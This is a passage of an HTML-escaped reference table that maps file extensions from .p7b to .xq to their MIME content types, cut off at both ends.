&lt;td style=&#34;text-align:left&#34;&gt;application/x-pkcs12&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.p7b&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-pkcs7-certificates&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.p7c&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/pkcs7-mime&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.p7m&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/pkcs7-mime&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.p7r&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-pkcs7-certreqresp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.p7s&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/pkcs7-signature&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pc5&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-pc5&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pci&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-pci&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pcl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-pcl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pcx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-pcx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pdf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/pdf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pdf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/pdf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pdx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.adobe.pdx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pfx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-pkcs12&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pgl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-pgl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pic&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-pic&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pko&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-pki.pko&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-perl&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.plg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/html&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pls&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/scpls&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.plt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-plt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.png&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/png&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.png&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-png&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pot&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-powerpoint&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ppa&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-powerpoint&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ppm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ppm&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pps&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-powerpoint&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ppt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-powerpoint&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ppt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ppt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pr&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-pr&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.prf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/pics-rules&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.prn&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-prn&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.prt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-prt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ps&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ps&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ps&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/postscript&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ptn&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ptn&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.pwz&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-powerpoint&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.r3t&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/vnd.rn-realtext3d&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ra&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/vnd.rn-realaudio&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ram&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/x-pn-realaudio&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ras&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ras&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rat&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/rat-file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rdf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rec&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.rn-recording&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.red&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-red&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rgb&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-rgb&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rjs&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.rn-realsystem-rjs&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rjt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.rn-realsystem-rjt&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rlc&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-rlc&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rle&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-rle&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.rn-realmedia&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rmf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.adobe.rmf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rmi&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/mid&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rmj&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.rn-realsystem-rmj&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rmm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/x-pn-realaudio&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rmp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.rn-rn_music_package&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rms&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.rn-realmedia-secure&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rmvb&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.rn-realmedia-vbr&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rmx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.rn-realsystem-rmx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rnx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.rn-realplayer&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/vnd.rn-realpix&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rpm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/x-pn-realaudio-plugin&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rsml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.rn-rsml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/vnd.rn-realtext&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rtf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/msword&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rtf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-rtf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.rv&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/vnd.rn-realvideo&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.sam&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-sam&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.sat&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-sat&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.sdp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/sdp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.sdw&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-sdw&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.sit&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-stuffit&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.slb&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-slb&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.sld&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-sld&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.slk&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;drawing/x-slk&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.smi&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/smil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.smil&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/smil&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.smk&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-smk&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.snd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/basic&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.sol&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/plain&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.sor&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/plain&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.spc&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-pkcs7-certificates&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.spl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/futuresplash&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.spp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ssm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/streamingmedia&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.sst&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-pki.certstore&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.stl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-pki.stl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.stm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/html&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.sty&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-sty&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.svg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.swf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-shockwave-flash&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.tdf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-tdf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.tg4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-tg4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.tga&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-tga&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.tif&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/tiff&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.tif&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-tif&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.tiff&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/tiff&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.tld&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.top&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;drawing/x-top&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.torrent&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-bittorrent&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.tsd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.txt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/plain&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.uin&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-icq&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.uls&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/iuls&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vcf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/x-vcard&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vda&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-vda&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vdx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.visio&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vpg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-vpeg005&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vsd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.visio&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vsd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-vsd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vss&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.visio&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vst&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.visio&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vst&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-vst&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vsw&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.visio&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vsx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.visio&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vtx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.visio&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.vxml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wav&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/wav&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wax&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/x-ms-wax&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wb1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wb1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wb2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wb2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wb3&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wb3&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wbmp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/vnd.wap.wbmp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wiz&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/msword&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wk3&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wk3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wk4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wk4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wkq&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wkq&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wks&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wks&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-ms-wm&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wma&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/x-ms-wma&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wmd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ms-wmd&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wmf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wmf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/vnd.wap.wml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wmv&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-ms-wmv&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wmx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-ms-wmx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wmz&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ms-wmz&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wp6&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wp6&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wpd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wpd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wpg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wpg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wpl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-wpl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wq1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wq1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wr1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wr1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wri&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wri&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wrk&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-wrk&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ws&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ws&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ws2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ws&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wsc&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/scriptlet&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wsdl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.wvx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-ms-wvx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xdp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.adobe.xdp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xdr&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xfd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.adobe.xfd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xfdf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.adobe.xfdf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xhtml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/html&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xls&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-excel&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xls&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-xls&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xlw&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-xlw&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xpl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/scpls&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.xq&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
